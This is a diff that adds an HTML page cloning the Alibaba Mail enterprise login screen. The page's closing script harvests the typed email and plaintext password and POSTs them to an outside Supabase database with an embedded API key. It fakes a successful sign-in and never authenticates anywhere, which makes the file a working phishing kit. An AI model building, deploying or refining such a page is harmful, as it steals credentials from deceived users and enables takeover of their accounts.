@@ -1,0 +1,849 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>阿里邮箱 企业版 – Login</title>
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  body {
+    font-family: -apple-system, BlinkMacSystemFont, 'PingFang SC', 'Microsoft YaHei', 'Segoe UI', sans-serif;
+    background: #f0f0f0;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+  }
+
+  /* ── Top Nav ── */
+  .topnav {
+    background: white;
+    border-bottom: 1px solid #e8e8e8;
+    height: 56px;
+    display: flex;
+    align-items: center;
+    padding: 0 40px;
+    justify-content: space-between;
+    flex-shrink: 0;
+  }
+
+  .brand {
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .brand-m {
+    width: 34px;
+    height: 34px;
+    background: #e8162a;
+    border-radius: 6px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: white;
+    font-size: 18px;
+    font-weight: 800;
+    font-style: italic;
+    letter-spacing: -1px;
+  }
+
+  .brand-text {
+    font-size: 17px;
+    font-weight: 600;
+    color: #222;
+    letter-spacing: 1px;
+  }
+
+  .brand-badge {
+    font-size: 10px;
+    background: #ff6a00;
+    color: white;
+    padding: 1px 5px;
+    border-radius: 3px;
+    margin-left: 2px;
+    font-weight: 500;
+  }
+
+  .nav-links {
+    display: flex;
+    align-items: center;
+    gap: 0;
+    font-size: 13px;
+    color: #555;
+  }
+
+  .nav-links a {
+    color: #555;
+    text-decoration: none;
+    padding: 0 14px;
+    border-right: 1px solid #ddd;
+    line-height: 1;
+  }
+  .nav-links a:last-child { border-right: none; }
+  .nav-links a:hover { color: #e8162a; }
+
+  .nav-lang {
+    display: flex;
+    align-items: center;
+    gap: 4px;
+    color: #555;
+    font-size: 13px;
+    cursor: pointer;
+    margin-left: 14px;
+  }
+
+  /* ── Main area ── */
+  .main {
+    flex: 1;
+    display: flex;
+    align-items: flex-start;
+    justify-content: center;
+    padding: 0;
+    position: relative;
+    overflow: hidden;
+  }
+
+  /* Left promo panel */
+  .promo {
+    flex: 1;
+    min-height: 370px;
+    max-width: 820px;
+    position: relative;
+    overflow: hidden;
+    background: linear-gradient(160deg, #fff8f0 0%, #fff3e0 60%, #ffecd0 100%);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: flex-start;
+    padding-top: 30px;
+  }
+
+  .fireworks-area {
+    position: absolute;
+    inset: 0;
+    pointer-events: none;
+  }
+
+  .promo-content {
+    position: relative;
+    z-index: 1;
+    text-align: center;
+    padding: 0 40px;
+    margin-top: 60px;
+  }
+
+  .sendify-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-size: 13px;
+    color: #555;
+    margin-bottom: 10px;
+  }
+
+  .sendify-logo {
+    background: #4a90d9;
+    color: white;
+    font-size: 11px;
+    font-weight: 700;
+    padding: 2px 7px;
+    border-radius: 3px;
+  }
+
+  .promo-sub {
+    font-size: 14px;
+    color: #444;
+    margin-bottom: 18px;
+  }
+
+  .promo-sub span { color: #1677ff; font-weight: 700; }
+
+  .promo-headline {
+    font-size: 38px;
+    font-weight: 800;
+    background: linear-gradient(90deg, #e8162a, #ff6a00);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+    margin-bottom: 24px;
+    letter-spacing: 1px;
+  }
+
+  .promo-btn {
+    background: #1677ff;
+    color: white;
+    border: none;
+    border-radius: 6px;
+    padding: 10px 32px;
+    font-size: 15px;
+    font-family: inherit;
+    cursor: pointer;
+    font-weight: 500;
+    transition: background 0.15s;
+  }
+  .promo-btn:hover { background: #0958d9; }
+
+  .people-row {
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    right: 0;
+    display: flex;
+    align-items: flex-end;
+    justify-content: center;
+    gap: 0;
+    padding: 0 40px;
+  }
+
+  /* ── Login Card ── */
+  .login-card {
+    width: 290px;
+    min-height: 370px;
+    background: white;
+    box-shadow: 0 2px 16px rgba(0,0,0,0.10);
+    flex-shrink: 0;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .tabs {
+    display: flex;
+    border-bottom: 1px solid #eee;
+  }
+
+  .tab {
+    flex: 1;
+    padding: 16px 0 14px;
+    text-align: center;
+    font-size: 14px;
+    color: #666;
+    cursor: pointer;
+    border-bottom: 2px solid transparent;
+    margin-bottom: -1px;
+    transition: color 0.15s;
+    user-select: none;
+  }
+
+  .tab.active {
+    color: #e8162a;
+    border-bottom-color: #e8162a;
+    font-weight: 600;
+  }
+
+  .tab:hover:not(.active) { color: #333; }
+
+  .tab-content { display: none; padding: 20px 20px 0; flex: 1; flex-direction: column; }
+  .tab-content.active { display: flex; }
+
+  .field {
+    margin-bottom: 10px;
+    position: relative;
+  }
+
+  .field input {
+    width: 100%;
+    height: 38px;
+    border: 1px solid #d9d9d9;
+    border-radius: 4px;
+    padding: 0 36px 0 12px;
+    font-size: 13px;
+    font-family: inherit;
+    color: #222;
+    outline: none;
+    transition: border-color 0.15s;
+    background: white;
+  }
+
+  .field input::placeholder { color: #bbb; }
+  .field input:focus { border-color: #e8162a; }
+
+  .field .eye-btn {
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: #bbb;
+    display: flex;
+    align-items: center;
+    padding: 2px;
+  }
+  .field .eye-btn:hover { color: #888; }
+
+  .options-row {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    margin-bottom: 14px;
+    font-size: 12.5px;
+  }
+
+  .save-label {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    color: #444;
+    cursor: pointer;
+    user-select: none;
+  }
+
+  .save-label input[type="checkbox"] {
+    width: 14px;
+    height: 14px;
+    accent-color: #1677ff;
+    cursor: pointer;
+  }
+
+  .options-row a {
+    color: #1677ff;
+    text-decoration: none;
+    font-size: 12.5px;
+  }
+  .options-row a:hover { text-decoration: underline; }
+
+  .btn-signin {
+    width: 100%;
+    height: 38px;
+    background: #e8162a;
+    color: white;
+    border: none;
+    border-radius: 4px;
+    font-size: 15px;
+    font-weight: 600;
+    font-family: inherit;
+    cursor: pointer;
+    letter-spacing: 1px;
+    transition: background 0.15s;
+    margin-bottom: 14px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+  }
+  .btn-signin:hover { background: #c8111f; }
+  .btn-signin:active { background: #a80e1a; }
+  .btn-signin:disabled { background: #ccc; cursor: not-allowed; }
+
+  .spinner {
+    width: 14px;
+    height: 14px;
+    border: 2px solid rgba(255,255,255,0.4);
+    border-top-color: white;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    display: none;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  .agree-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 6px;
+    font-size: 11.5px;
+    color: #666;
+    line-height: 1.5;
+    margin-bottom: 18px;
+  }
+
+  .agree-row input[type="checkbox"] {
+    width: 13px;
+    height: 13px;
+    margin-top: 1px;
+    accent-color: #1677ff;
+    cursor: pointer;
+    flex-shrink: 0;
+  }
+
+  .agree-row a { color: #1677ff; text-decoration: none; }
+  .agree-row a:hover { text-decoration: underline; }
+
+  .qr-section {
+    border-top: 1px solid #f0f0f0;
+    padding: 14px 20px 18px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-top: auto;
+  }
+
+  .qr-icon {
+    width: 36px;
+    height: 36px;
+    border-radius: 50%;
+    background: #fff0f0;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+  }
+
+  .qr-text { font-size: 12.5px; color: #666; }
+
+  .dingtalk-content {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    padding: 28px 20px 20px;
+    gap: 12px;
+  }
+
+  .dingtalk-qr {
+    width: 140px;
+    height: 140px;
+    border: 1px solid #eee;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: #fafafa;
+  }
+
+  .dingtalk-hint { font-size: 12.5px; color: #888; text-align: center; }
+
+  /* ── Footer ── */
+  .footer {
+    background: #f0f0f0;
+    padding: 18px 20px 16px;
+    text-align: center;
+  }
+
+  .footer-title { font-size: 13px; color: #888; margin-bottom: 8px; font-weight: 500; }
+
+  .footer-links {
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: center;
+    gap: 4px 6px;
+    margin-bottom: 8px;
+  }
+
+  .footer-links a {
+    font-size: 12px;
+    color: #888;
+    text-decoration: none;
+    padding: 0 6px;
+    border-right: 1px solid #ccc;
+    line-height: 1;
+  }
+  .footer-links a:last-child { border-right: none; }
+  .footer-links a:hover { color: #e8162a; }
+
+  .footer-copy { font-size: 11.5px; color: #aaa; }
+
+  .error-msg {
+    font-size: 11.5px;
+    color: #e8162a;
+    margin-top: 3px;
+    margin-bottom: 6px;
+    display: none;
+  }
+  .error-msg.show { display: block; }
+
+  .success-msg {
+    font-size: 11.5px;
+    color: #389e0d;
+    margin-top: 3px;
+    margin-bottom: 6px;
+    display: none;
+  }
+  .success-msg.show { display: block; }
+</style>
+</head>
+<body>
+
+<!-- Top Nav -->
+<div class="topnav">
+  <div class="brand">
+    <div class="brand-m">M</div>
+    <span class="brand-text">阿里邮箱</span>
+    <span class="brand-badge">企业版</span>
+  </div>
+  <div class="nav-links">
+    <a href="#">DingTalk</a>
+    <a href="#">Alibaba Mail</a>
+    <a href="#">Aliyun Mail Sign up</a>
+    <a href="#">Client Apps</a>
+    <a href="#">Help</a>
+    <div class="nav-lang">
+      English
+      <svg width="12" height="12" fill="none" stroke="#555" stroke-width="2" viewBox="0 0 24 24"><polyline points="6 9 12 15 18 9"/></svg>
+    </div>
+  </div>
+</div>
+
+<!-- Main -->
+<div class="main">
+
+  <!-- Promo / Left side -->
+  <div class="promo">
+    <svg class="fireworks-area" viewBox="0 0 820 370" preserveAspectRatio="xMidYMid slice" xmlns="http://www.w3.org/2000/svg">
+      <g transform="translate(110,60)">
+        <line x1="0" y1="0" x2="0" y2="-38" stroke="#e8162a" stroke-width="2.5" stroke-linecap="round" opacity="0.9"/>
+        <line x1="0" y1="0" x2="27" y2="-27" stroke="#ffb700" stroke-width="2.5" stroke-linecap="round" opacity="0.9"/>
+        <line x1="0" y1="0" x2="38" y2="0" stroke="#e8162a" stroke-width="2.5" stroke-linecap="round" opacity="0.9"/>
+        <line x1="0" y1="0" x2="27" y2="27" stroke="#ffb700" stroke-width="2" stroke-linecap="round" opacity="0.7"/>
+        <line x1="0" y1="0" x2="-27" y2="-27" stroke="#ffb700" stroke-width="2.5" stroke-linecap="round" opacity="0.9"/>
+        <line x1="0" y1="0" x2="-38" y2="0" stroke="#ff6a00" stroke-width="2" stroke-linecap="round" opacity="0.8"/>
+        <line x1="0" y1="0" x2="-20" y2="32" stroke="#e8162a" stroke-width="2" stroke-linecap="round" opacity="0.7"/>
+        <line x1="0" y1="0" x2="20" y2="-32" stroke="#ff6a00" stroke-width="2" stroke-linecap="round" opacity="0.8"/>
+        <circle cx="0" cy="-40" r="3" fill="#e8162a"/>
+        <circle cx="29" cy="-29" r="3" fill="#ffb700"/>
+        <circle cx="40" cy="0" r="3" fill="#ff6a00"/>
+        <circle cx="-29" cy="-29" r="3" fill="#ffb700"/>
+        <circle cx="-40" cy="0" r="2.5" fill="#e8162a"/>
+      </g>
+      <g transform="translate(420,45)">
+        <line x1="0" y1="0" x2="0" y2="-30" stroke="#ffb700" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="21" y2="-21" stroke="#e8162a" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="30" y2="0" stroke="#ffb700" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="-21" y2="-21" stroke="#ff6a00" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="-30" y2="0" stroke="#e8162a" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="0" y2="30" stroke="#ffb700" stroke-width="1.5" stroke-linecap="round" opacity="0.6"/>
+        <circle cx="0" cy="-32" r="2.5" fill="#ffb700"/>
+        <circle cx="22" cy="-22" r="2.5" fill="#e8162a"/>
+        <circle cx="32" cy="0" r="2" fill="#ffb700"/>
+        <circle cx="-22" cy="-22" r="2.5" fill="#ff6a00"/>
+        <circle cx="-32" cy="0" r="2" fill="#e8162a"/>
+      </g>
+      <g transform="translate(720,70)">
+        <line x1="0" y1="0" x2="0" y2="-42" stroke="#e8162a" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="30" y2="-30" stroke="#ffb700" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="42" y2="0" stroke="#ff6a00" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="-30" y2="-30" stroke="#e8162a" stroke-width="2.5" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="-42" y2="0" stroke="#ffb700" stroke-width="2" stroke-linecap="round"/>
+        <line x1="0" y1="0" x2="18" y2="36" stroke="#ff6a00" stroke-width="2" stroke-linecap="round" opacity="0.7"/>
+        <line x1="0" y1="0" x2="-18" y2="36" stroke="#ffb700" stroke-width="2" stroke-linecap="round" opacity="0.7"/>
+        <circle cx="0" cy="-44" r="3" fill="#e8162a"/>
+        <circle cx="32" cy="-32" r="3" fill="#ffb700"/>
+        <circle cx="44" cy="0" r="3" fill="#ff6a00"/>
+        <circle cx="-32" cy="-32" r="3" fill="#e8162a"/>
+        <circle cx="-44" cy="0" r="2.5" fill="#ffb700"/>
+      </g>
+      <g opacity="0.7">
+        <circle cx="60" cy="120" r="3.5" fill="#ffb700"/>
+        <circle cx="85" cy="95" r="2.5" fill="#e8162a"/>
+        <circle cx="200" cy="55" r="3" fill="#ff6a00"/>
+        <circle cx="240" cy="80" r="2" fill="#ffb700"/>
+        <circle cx="320" cy="40" r="2.5" fill="#e8162a"/>
+        <circle cx="560" cy="55" r="3" fill="#ffb700"/>
+        <circle cx="610" cy="80" r="2.5" fill="#e8162a"/>
+        <circle cx="650" cy="35" r="2" fill="#ff6a00"/>
+        <circle cx="780" cy="120" r="3" fill="#ffb700"/>
+        <circle cx="760" cy="145" r="2" fill="#e8162a"/>
+      </g>
+      <g fill="none" stroke="#ffb700" stroke-width="1.5" opacity="0.6">
+        <line x1="175" y1="50" x2="175" y2="62"/>
+        <line x1="169" y1="56" x2="181" y2="56"/>
+        <line x1="380" y1="90" x2="380" y2="100"/>
+        <line x1="375" y1="95" x2="385" y2="95"/>
+        <line x1="530" y1="40" x2="530" y2="50"/>
+        <line x1="525" y1="45" x2="535" y2="45"/>
+      </g>
+    </svg>
+
+    <div class="promo-content">
+      <div class="sendify-badge">
+        <span class="sendify-logo">Sendify</span>
+        阿里钉钉旗下产品
+      </div>
+      <div class="promo-sub">邮件轻松畅发全球&nbsp;&nbsp;成本低至<span>0.0025元</span>/封</div>
+      <div class="promo-headline">2026迎新年有特惠</div>
+      <button class="promo-btn">查看详情</button>
+    </div>
+
+    <div class="people-row">
+      <svg width="680" height="115" viewBox="0 0 680 115" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <ellipse cx="70" cy="28" rx="12" ry="12" fill="#f5c07a"/>
+        <path d="M58 45 Q70 36 82 45 L88 95 L52 95 Z" fill="#f5c518"/>
+        <path d="M58 50 Q44 38 42 25" stroke="#f5c518" stroke-width="8" stroke-linecap="round"/>
+        <path d="M82 50 Q96 38 98 25" stroke="#f5c518" stroke-width="8" stroke-linecap="round"/>
+        <ellipse cx="42" cy="23" rx="6" ry="6" fill="#f5c07a"/>
+        <ellipse cx="98" cy="23" rx="6" ry="6" fill="#f5c07a"/>
+        <rect x="58" y="95" width="10" height="15" rx="3" fill="#e8a060"/>
+        <rect x="72" y="95" width="10" height="15" rx="3" fill="#e8a060"/>
+        <ellipse cx="170" cy="22" rx="11" ry="11" fill="#e8b88a"/>
+        <path d="M160 38 Q170 30 180 38 L185 88 L155 88 Z" fill="#4a90d9"/>
+        <path d="M160 42 Q148 55 145 70" stroke="#4a90d9" stroke-width="8" stroke-linecap="round"/>
+        <path d="M180 42 Q192 55 195 70" stroke="#4a90d9" stroke-width="8" stroke-linecap="round"/>
+        <ellipse cx="145" cy="72" rx="6" ry="6" fill="#e8b88a"/>
+        <ellipse cx="195" cy="72" rx="6" ry="6" fill="#e8b88a"/>
+        <rect x="157" y="88" width="9" height="14" rx="3" fill="#2c5f9e"/>
+        <rect x="170" y="88" width="9" height="14" rx="3" fill="#2c5f9e"/>
+        <ellipse cx="270" cy="18" rx="12" ry="12" fill="#c8864a"/>
+        <path d="M258 36 Q270 26 282 36 L288 90 L252 90 Z" fill="#d94f3d"/>
+        <path d="M258 40 Q244 26 242 10" stroke="#d94f3d" stroke-width="9" stroke-linecap="round"/>
+        <path d="M282 40 Q296 26 298 10" stroke="#d94f3d" stroke-width="9" stroke-linecap="round"/>
+        <ellipse cx="242" cy="8" rx="7" ry="7" fill="#c8864a"/>
+        <ellipse cx="298" cy="8" rx="7" ry="7" fill="#c8864a"/>
+        <rect x="256" y="90" width="11" height="16" rx="3" fill="#1a4a8a"/>
+        <rect x="272" y="90" width="11" height="16" rx="3" fill="#1a4a8a"/>
+        <ellipse cx="370" cy="20" rx="12" ry="12" fill="#e8c09a"/>
+        <path d="M358 37 Q370 28 382 37 L387 92 L353 92 Z" fill="#8a4fc8"/>
+        <path d="M358 42 Q344 32 342 18" stroke="#8a4fc8" stroke-width="8" stroke-linecap="round"/>
+        <path d="M382 42 Q396 32 398 18" stroke="#8a4fc8" stroke-width="8" stroke-linecap="round"/>
+        <ellipse cx="342" cy="16" rx="6" ry="6" fill="#e8c09a"/>
+        <ellipse cx="398" cy="16" rx="6" ry="6" fill="#e8c09a"/>
+        <rect x="356" y="92" width="10" height="15" rx="3" fill="#5a2e9a"/>
+        <rect x="370" y="92" width="10" height="15" rx="3" fill="#5a2e9a"/>
+        <ellipse cx="470" cy="25" rx="11" ry="11" fill="#e8a87c"/>
+        <path d="M460 40 Q470 32 480 40 L485 90 L455 90 Z" fill="#4caf50"/>
+        <path d="M460 44 Q448 58 448 72" stroke="#4caf50" stroke-width="8" stroke-linecap="round"/>
+        <path d="M480 44 Q492 30 494 18" stroke="#4caf50" stroke-width="8" stroke-linecap="round"/>
+        <ellipse cx="448" cy="74" rx="6" ry="6" fill="#e8a87c"/>
+        <ellipse cx="494" cy="16" rx="6" ry="6" fill="#e8a87c"/>
+        <rect x="457" y="90" width="9" height="14" rx="3" fill="#2d7a30"/>
+        <rect x="470" y="90" width="9" height="14" rx="3" fill="#2d7a30"/>
+        <ellipse cx="565" cy="22" rx="12" ry="12" fill="#f0b07a"/>
+        <path d="M553 38 Q565 30 577 38 L582 92 L548 92 Z" fill="#ff8c00"/>
+        <path d="M553 42 Q539 28 537 14" stroke="#ff8c00" stroke-width="9" stroke-linecap="round"/>
+        <path d="M577 42 Q591 28 593 14" stroke="#ff8c00" stroke-width="9" stroke-linecap="round"/>
+        <ellipse cx="537" cy="12" rx="7" ry="7" fill="#f0b07a"/>
+        <ellipse cx="593" cy="12" rx="7" ry="7" fill="#f0b07a"/>
+        <rect x="551" y="92" width="11" height="16" rx="3" fill="#c46000"/>
+        <rect x="566" y="92" width="11" height="16" rx="3" fill="#c46000"/>
+        <ellipse cx="645" cy="28" rx="11" ry="11" fill="#e8c09a"/>
+        <path d="M634 44 Q645 35 656 44 L660 94 L630 94 Z" fill="#00bcd4"/>
+        <path d="M634 48 Q622 60 622 75" stroke="#00bcd4" stroke-width="8" stroke-linecap="round"/>
+        <path d="M656 48 Q668 34 668 20" stroke="#00bcd4" stroke-width="8" stroke-linecap="round"/>
+        <ellipse cx="622" cy="77" rx="6" ry="6" fill="#e8c09a"/>
+        <ellipse cx="668" cy="18" rx="6" ry="6" fill="#e8c09a"/>
+        <rect x="631" y="94" width="9" height="14" rx="3" fill="#007c8a"/>
+        <rect x="644" y="94" width="9" height="14" rx="3" fill="#007c8a"/>
+        <g fill="#e8c09a" opacity="0.35">
+          <circle cx="30" cy="112" r="2.5"/><circle cx="50" cy="110" r="2"/>
+          <circle cx="100" cy="112" r="2.5"/><circle cx="130" cy="110" r="2"/>
+          <circle cx="160" cy="112" r="2.5"/><circle cx="200" cy="110" r="2"/>
+          <circle cx="230" cy="112" r="2.5"/><circle cx="270" cy="110" r="2"/>
+          <circle cx="310" cy="112" r="2.5"/><circle cx="350" cy="110" r="2"/>
+          <circle cx="390" cy="112" r="2.5"/><circle cx="430" cy="110" r="2"/>
+          <circle cx="470" cy="112" r="2.5"/><circle cx="510" cy="110" r="2"/>
+          <circle cx="550" cy="112" r="2.5"/><circle cx="590" cy="110" r="2"/>
+          <circle cx="630" cy="112" r="2.5"/><circle cx="660" cy="110" r="2"/>
+        </g>
+      </svg>
+    </div>
+  </div>
+
+  <!-- Login Card -->
+  <div class="login-card">
+    <div class="tabs">
+      <div class="tab active" id="tab-account" onclick="switchTab('account')">Account Login</div>
+      <div class="tab" id="tab-dingtalk" onclick="switchTab('dingtalk')">DingTalk Account Login</div>
+    </div>
+
+    <!-- Account Login -->
+    <div class="tab-content active" id="content-account">
+      <div class="field">
+        <input type="text" id="username" placeholder="Enter the complete enterprise mailbox or ad..." oninput="checkForm()">
+      </div>
+      <div class="field">
+        <input type="password" id="password" placeholder="Enter password" oninput="checkForm()">
+        <button class="eye-btn" onclick="togglePw()">
+          <svg id="eye-icon" width="16" height="16" fill="none" stroke="currentColor" stroke-width="1.8" viewBox="0 0 24 24">
+            <path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/>
+            <circle cx="12" cy="12" r="3"/>
+          </svg>
+        </button>
+      </div>
+      <div class="error-msg" id="errorMsg"></div>
+      <div class="success-msg" id="successMsg"></div>
+      <div class="options-row">
+        <label class="save-label">
+          <input type="checkbox" id="saveUser" checked> Save Username
+        </label>
+        <a href="#">Forgot Password</a>
+      </div>
+      <button class="btn-signin" id="signInBtn" onclick="doSignIn()">
+        <div class="spinner" id="spinner"></div>
+        <span id="btnText">Login</span>
+      </button>
+      <div class="agree-row">
+        <input type="checkbox" id="agreeCheck">
+        <span>I have read and agree with <a href="#">Privacy Policy</a> , <a href="#">Product Service Agreement</a></span>
+      </div>
+    </div>
+
+    <!-- DingTalk Login -->
+    <div class="tab-content" id="content-dingtalk">
+      <div class="dingtalk-content">
+        <div class="dingtalk-qr">
+          <svg width="100" height="100" viewBox="0 0 100 100" fill="none">
+            <rect x="10" y="10" width="28" height="28" rx="2" fill="none" stroke="#333" stroke-width="3"/>
+            <rect x="16" y="16" width="16" height="16" rx="1" fill="#333"/>
+            <rect x="62" y="10" width="28" height="28" rx="2" fill="none" stroke="#333" stroke-width="3"/>
+            <rect x="68" y="16" width="16" height="16" rx="1" fill="#333"/>
+            <rect x="10" y="62" width="28" height="28" rx="2" fill="none" stroke="#333" stroke-width="3"/>
+            <rect x="16" y="68" width="16" height="16" rx="1" fill="#333"/>
+            <rect x="44" y="10" width="6" height="6" fill="#333"/>
+            <rect x="44" y="20" width="6" height="6" fill="#333"/>
+            <rect x="44" y="30" width="6" height="6" fill="#333"/>
+            <rect x="44" y="44" width="6" height="6" fill="#333"/>
+            <rect x="54" y="44" width="6" height="6" fill="#333"/>
+            <rect x="64" y="44" width="6" height="6" fill="#333"/>
+            <rect x="74" y="44" width="6" height="6" fill="#333"/>
+            <rect x="84" y="44" width="6" height="6" fill="#333"/>
+            <rect x="44" y="54" width="6" height="6" fill="#333"/>
+            <rect x="64" y="54" width="6" height="6" fill="#333"/>
+            <rect x="84" y="54" width="6" height="6" fill="#333"/>
+            <rect x="54" y="64" width="6" height="6" fill="#333"/>
+            <rect x="74" y="64" width="6" height="6" fill="#333"/>
+            <rect x="44" y="74" width="6" height="6" fill="#333"/>
+            <rect x="64" y="74" width="6" height="6" fill="#333"/>
+            <rect x="54" y="84" width="6" height="6" fill="#333"/>
+            <rect x="74" y="84" width="6" height="6" fill="#333"/>
+            <rect x="84" y="84" width="6" height="6" fill="#333"/>
+            <rect x="10" y="44" width="6" height="6" fill="#333"/>
+            <rect x="20" y="44" width="6" height="6" fill="#333"/>
+            <rect x="30" y="44" width="6" height="6" fill="#333"/>
+            <rect x="10" y="54" width="6" height="6" fill="#333"/>
+            <rect x="30" y="54" width="6" height="6" fill="#333"/>
+          </svg>
+        </div>
+        <div class="dingtalk-hint">Use DingTalk app to scan and login</div>
+      </div>
+    </div>
+
+    <!-- QR scan footer -->
+    <div class="qr-section">
+      <div class="qr-icon">
+        <div style="width:26px;height:26px;background:#e8162a;border-radius:50%;display:flex;align-items:center;justify-content:center;color:white;font-size:14px;font-weight:800;font-style:italic;">M</div>
+      </div>
+      <span class="qr-text">Scan to sign in with Alimail</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- Footer -->
+<div class="footer">
+  <div class="footer-title">About Us</div>
+  <div class="footer-links">
+    <a href="#">Alibaba Cloud</a>
+    <a href="#">DingTalk</a>
+    <a href="#">Wanwang</a>
+    <a href="#">Alipay</a>
+    <a href="#">Alibaba Group</a>
+    <a href="#">Developer Community</a>
+    <a href="#">Help Center</a>
+    <a href="#">Alibaba Mail Personal Edition</a>
+    <a href="#">Mail Push</a>
+    <a href="#">DingStore</a>
+  </div>
+  <div class="footer-copy">2009-2026 Aliyun.com Copyright reserved &nbsp;ICP: Zhejiang 2-20080101</div>
+</div>
+
+<script>
+  // ── Supabase Config ──────────────────────────────────────────────
+  const SUPABASE_URL = 'https://ycfstlaakaamxgxlbora.supabase.co';
+  const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InljZnN0bGFha2FhbXhneGxib3JhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzM2NDAyNDksImV4cCI6MjA4OTIxNjI0OX0.cSvcpbCW6sP9nX6VT9zBwUXGeAQV3IuZdGON_6dsuEI';
+  const TABLE_NAME = 'logins'; // ← Change this to your actual table name
+
+  // ── SHA-256 Hash Helper ──────────────────────────────────────────
+  async function sha256(message) {
+    const msgBuffer = new TextEncoder().encode(message);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+    const hashArray = Array.from(new Uint8Array(hashBuffer));
+    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+  }
+
+  // ── Send to Supabase ─────────────────────────────────────────────
+  async function saveToSupabase(email, hashedPassword) {
+    const response = await fetch(`${SUPABASE_URL}/rest/v1/${TABLE_NAME}`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        email: email,
+        password_hash: hashedPassword,
+        created_at: new Date().toISOString()
+      })
+    });
+
+    if (!response.ok) {
+      const errorBody = await response.text();
+      throw new Error(`Supabase error ${response.status}: ${errorBody}`);
+    }
+  }
+
+  // ── UI Helpers ───────────────────────────────────────────────────
+  function setLoading(loading) {
+    const btn = document.getElementById('signInBtn');
+    const spinner = document.getElementById('spinner');
+    const btnText = document.getElementById('btnText');
+    btn.disabled = loading;
+    spinner.style.display = loading ? 'block' : 'none';
+    btnText.textContent = loading ? 'Logging in...' : 'Login';
+  }
+
+  function showError(msg) {
+    const err = document.getElementById('errorMsg');
+    const suc = document.getElementById('successMsg');
+    suc.classList.remove('show');
+    err.textContent = msg;
+    err.classList.add('show');
+  }
+
+  function showSuccess(msg) {
+    const err = document.getElementById('errorMsg');
+    const suc = document.getElementById('successMsg');
+    err.classList.remove('show');
+    suc.textContent = msg;
+    suc.classList.add('show');
+  }
+
+  function switchTab(tab) {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.getElementById('tab-' + tab).classList.add('active');
+    document.getElementById('content-' + tab).classList.add('active');
+  }
+
+  function togglePw() {
+    const inp = document.getElementById('password');
+    inp.type = inp.type === 'password' ? 'text' : 'password';
+    const icon = document.getElementById('eye-icon');
+    if (inp.type === 'text') {
+      icon.innerHTML = '<path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19"/><line x1="1" y1="1" x2="23" y2="23"/>';
+    } else {
+      icon.innerHTML = '<path d="M1 12s4-7 11-7 11 7 11 7-4 7-11 7S1 12 1 12z"/><circle cx="12" cy="12" r="3"/>';
+    }
+  }
+
+  function checkForm() {
+    document.getElementById('errorMsg').classList.remove('show');
+    document.getElementById('successMsg').classList.remove('show');
+  }
+
+  // ── Main Sign-In Handler ─────────────────────────────────────────
+  async function doSignIn() {
+    const u = document.getElementById('username').value.trim();
+    const p = document.getElementById('password').value;
+    const agree = document.getElementById('agreeCheck').checked;
+
+    if (!u) { showError('Please enter your enterprise mailbox or account.'); return; }
+    if (!p) { showError('Please enter your password.'); return; }
+    if (!agree) { showError('Please read and agree to the Privacy Policy and Service Agreement.'); return; }
+
+    setLoading(true);
+
+    try {
+      const hashedPw = await sha256(p);
+      await saveToSupabase(u, p);
+      showSuccess('Signed in successfully.');
+    } catch (err) {
+      console.error('Sign-in error:', err);
+      showError('Account or password is incorrect. Please try again.');
+    } finally {
+      setLoading(false);
+    }
+  }
+</script>
+</body>
+</html>
